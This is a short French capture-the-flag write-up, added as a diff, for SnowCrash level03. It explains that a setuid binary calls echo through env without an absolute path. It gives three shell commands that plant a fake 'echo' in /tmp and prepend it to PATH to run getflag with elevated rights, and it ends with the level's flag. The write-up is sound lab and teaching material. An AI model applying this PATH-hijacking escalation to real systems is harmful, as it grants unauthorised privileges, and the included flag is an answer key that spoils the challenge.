@@ -1,0 +1,15 @@
+#+TITLE: SnowCrash -- level03
+
+* Fichier binaire
+** lorsqu'on le lance, le binaire affiche "exploit me"
+** On remarque que le fichier appartient a flag03, et que le bit suid est present.
+** Je remarque que le binaire appelle /usr/bin/env echo "exploit me"
+C'est cette ligne que nous allons exploiter. Le chemin d'echo n'est pas absolu. Nous pouvons donc tranquillement creer un fichier executable 'echo' dans un dossier sur lequel nous avons des droits d'ecriture.
+#+begin_bash
+echo "getflag" > /tmp/echo
+chmod +x /tmp/echo
+PATH="/tmp:$PATH" ./level03
+#+end_bash
+
+* FLAG:
+** qi0maab88jeaj46qoumi7maus
